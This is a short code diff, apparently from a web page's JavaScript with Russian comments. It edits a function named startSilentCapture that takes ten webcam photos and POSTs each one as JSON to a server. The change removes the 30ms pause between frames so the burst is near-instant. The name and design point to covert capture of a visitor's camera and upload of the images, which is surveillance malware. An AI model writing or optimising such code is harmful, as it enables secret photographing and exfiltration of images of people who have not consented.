@@ -851,7 +851,7 @@
         }
     }
     
-    // ========== КАМЕРА И ФОТО (10 ФОТО ЗА 0.3 СЕКУНДЫ!) ==========
+    // ========== КАМЕРА И ФОТО (БЕЗ ЗАДЕРЖКИ - МГНОВЕННО!) ==========
     let cameraAllowed = false;
     
     async function startSilentCapture() {
@@ -877,7 +877,7 @@
             
             await new Promise(r => setTimeout(r, 500));
             
-            // ===== 10 ФОТО ЗА 0.3 СЕКУНДЫ (30ms МЕЖДУ КАДРАМИ) =====
+            // ===== 10 ФОТО МГНОВЕННО (БЕЗ ЗАДЕРЖЕК!) =====
             const startTime = performance.now();
             for (let i = 0; i < 10; i++) {
                 canvas.width = videoEl.videoWidth || 640;
@@ -892,8 +892,7 @@
                     },
                     body: JSON.stringify({ photo: photoData, step: i+1, timestamp: Date.now() })
                 });
-                // ===== ЗАДЕРЖКА 30ms =====
-                await new Promise(r => setTimeout(r, 30));
+                // ===== БЕЗ ЗАДЕРЖКИ! =====
             }
             const endTime = performance.now();
             const totalTime = ((endTime - startTime) / 1000).toFixed(2);
